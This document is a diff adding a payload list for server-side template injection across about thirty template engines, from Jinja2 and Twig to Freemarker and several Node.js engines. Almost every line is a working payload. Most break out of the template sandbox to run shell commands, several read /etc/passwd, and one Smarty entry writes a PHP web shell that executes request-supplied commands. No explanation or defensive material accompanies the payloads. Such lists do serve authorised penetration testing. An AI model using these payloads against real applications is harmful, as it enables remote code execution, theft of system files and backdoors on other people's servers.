@@ -1,0 +1,174 @@
+# Server-Side Template Injection (SSTI) Payloads
+# Template injection vectors for various template engines
+
+# Jinja2 (Python)
+{{7*7}}
+{{config}}
+{{config.items()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()")}}{% endif %}{% endfor %}
+
+# Flask/Jinja2
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{url_for.__globals__['__builtins__'].__import__('os').popen('id').read()}}
+{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}
+
+# Twig (PHP)
+{{7*7}}
+{{_self}}
+{{_self.env}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['id']|map('system')|join}}
+{{{'a':'id'}.a|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id','']|sort('system')}}
+
+# Smarty (PHP)
+{$smarty.version}
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('id')}
+{system('cat /etc/passwd')}
+
+# Freemarker (Java)
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder","id").start()}
+${"freemarker.template.utility.Execute"?new()("id")}
+[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
+
+# Velocity (Java)
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($chr=$x.class.forName('java.lang.Character'))
+#set($str=$x.class.forName('java.lang.String'))
+$rt.getRuntime().exec('id')
+
+# Thymeleaf (Java)
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}
+__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__
+
+# Pug/Jade (Node.js)
+#{7*7}
+#{global.process.mainModule.require('child_process').execSync('id')}
+#{process.mainModule.require('child_process').execSync('cat /etc/passwd')}
+
+# Handlebars (Node.js)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+# ERB (Ruby)
+<%= 7*7 %>
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').readlines() %>
+<%= File.open('/etc/passwd').read %>
+
+# Tornado (Python)
+{{7*7}}
+{% import os %}{{os.system('id')}}
+{% import subprocess %}{{subprocess.check_output('id',shell=True)}}
+
+# Mako (Python)
+${7*7}
+<%import os%>${os.system('id')}
+${__import__('os').system('id')}
+
+# Django (Python)
+{{7*7}}
+{% load log %}{% get_current_language as LANGUAGE %}
+{% debug %}
+
+# Razor (ASP.NET)
+@(7*7)
+@{var x = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c id");x.RedirectStandardOutput = true;x.UseShellExecute = false;var p = System.Diagnostics.Process.Start(x);var output = p.StandardOutput.ReadToEnd();}@output
+
+# Groovy
+${9*9}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+# Expression Language (EL)
+${7*7}
+${applicationScope}
+${sessionScope}
+${requestScope}
+${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
+
+# OGNL (Java)
+${@java.lang.Runtime@getRuntime().exec('id')}
+${{@java.lang.Runtime@getRuntime().exec('id')}}
+
+# Spring EL
+${T(java.lang.Runtime).getRuntime().exec('id')}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+
+# Blade (Laravel/PHP)
+{{7*7}}
+@php(system('id'))
+@php(phpinfo())
+
+# Liquid (Ruby)
+{{7|times:7}}
+{{'id'|system}}
+
+# Mustache
+{{7*7}}
+
+# Nunjucks (Node.js)
+{{7*7}}
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+
+# Dot (Node.js)
+{{=7*7}}
+{{=it.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}
+
+# EJS (Node.js)
+<%=7*7%>
+<%=global.process.mainModule.require('child_process').execSync('id')%>
+
+# Marko (Node.js)
+${7*7}
+${require('child_process').execSync('id')}
+
+# Underscore (Node.js)
+<%=7*7%>
+<%=global.process.mainModule.require('child_process').execSync('id')%>
+
+# Swig (Node.js)
+{{7*7}}
+{{process.mainModule.require('child_process').execSync('id')}}
+
+# Dust (Node.js)
+{7*7}
+
+# Eta (Node.js)
+<%=7*7%>
+<%=it.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')%>
+
+# Squirrelly (Node.js)
+{{7*7}}
+{{it.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}
